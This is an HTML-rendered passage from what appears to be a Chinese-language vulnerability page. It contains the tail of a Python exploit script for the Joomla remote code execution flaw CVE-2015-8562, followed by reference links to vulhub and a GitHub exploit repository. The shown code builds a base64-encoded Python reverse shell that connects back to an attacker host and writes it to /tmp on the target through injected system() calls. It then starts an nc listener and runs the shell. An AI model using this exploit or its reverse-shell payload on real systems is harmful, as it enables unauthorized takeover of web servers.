&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comm = &quot;python&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_name = shell_name+&quot;.py&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# pentestmonkey&#39;s Python reverse shell one-liner:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str_shell = &#39;&#39;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;&#39;&#39;+connection+&#39;&#39;&#39;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Base64 encoded the Python reverse shell as some chars were messing up in the exploit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;encoded_comm = base64.b64encode(str_shell)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = &quot;echo {} | base64 -d &gt; /tmp/{}&quot;.format(encoded_comm, shell_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}&quot;.format(args.RHOST)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;32;10m[+] Spawning listener on {}:{}&quot;.format(args.LHOST, args.LPORT) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listener = subprocess.Popen(args=[&quot;gnome-terminal&quot;, &quot;--command=nc -lvp &quot;+args.LPORT])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(5)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;37;10m[-] Uploading reverse shell to /tmp/{}&quot;.format(shell_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pl = generate_payload(&quot;system(&#39;&quot;+payload+&quot;&#39;);&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print get_url(args.RHOST, pl, args.method, proxyDict)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;32;10m[+] Spawning reverse shell...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;33;10m[-] Check if the listener caught the shell\033[1;37;10m&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pl = generate_payload(&quot;system(&#39;{} /tmp/{}&#39;);&quot;.format(comm, shell_name))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print get_url(args.RHOST, pl, args.method, proxyDict)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &#39;\033[1;31;10m\n[!] Missing Arguments\n\033[1;37;10m&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parser.print_help()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &quot;__main__&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Suppress SSL Warning due to unverified HTTPS requests.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;main()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except KeyboardInterrupt:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;31;10mQuitting...&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/VoidSec/Joomla_CVE-2015-8562</span></p></body>
</html>
